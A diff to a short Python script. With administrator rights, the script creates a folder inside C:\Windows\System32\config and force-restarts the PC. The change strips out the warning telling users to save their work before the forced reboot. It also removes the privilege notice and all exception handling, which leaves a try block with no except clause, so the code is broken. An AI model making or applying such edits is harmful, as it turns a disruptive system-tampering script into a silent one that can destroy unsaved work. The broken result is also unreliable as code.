@@ -10,7 +10,6 @@ def is_admin():
         return False
 
 if not is_admin():
-    print("This operation requires administrator privileges.")
     sys.exit(1)
 
 target_path = r"C:\Windows\System32\config\OSDATA"
@@ -20,10 +19,4 @@ try:
     print(f"Folder created at: {target_path}")
     
     # Force restart the PC
-    print("The system will restart in 10 seconds. Save any open work.")
     subprocess.run(["shutdown", "/r", "/f", "/t", "10"])
-    
-except PermissionError:
-    print("Permission denied. Even with admin rights, this is restricted.")
-except Exception as e:
-    print(f"Error: {e}")
